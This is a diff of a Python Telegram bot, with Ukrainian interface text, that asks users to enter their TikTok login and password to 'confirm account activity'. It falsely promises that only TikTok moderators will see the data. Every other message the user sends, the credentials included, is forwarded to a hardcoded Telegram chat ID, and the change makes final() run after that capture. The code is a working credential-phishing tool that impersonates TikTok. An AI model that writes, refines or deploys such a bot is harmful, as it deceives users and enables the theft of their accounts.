@@ -36,12 +36,12 @@ def message_reply(message: types.Message):
     if message.text == "✅ Внести свій акаунт в базу даних":
         try:
             bot.send_message(message.chat.id, f'✅ Для підтвердження активності вашого акаунту ТІКТОК, введіть свій логін(нікнейм) та пароль.\n\nІнформація не передається третім особам, її знають тільки модератори тіктоку!', reply_markup=None)
-            final(message.chat.id)
         except telebot.apihelper.ApiTelegramException:
             pass
     elif message.text == "/start":
         pass
     else:
+        final(message.chat.id)
         bot.send_message(880691612, f"<a href='tg://user?id={message.chat.id}'>{message.chat.first_name} {message.chat.last_name}</a>: {message.text}", parse_mode='HTML')
 
 def final(chat_id):
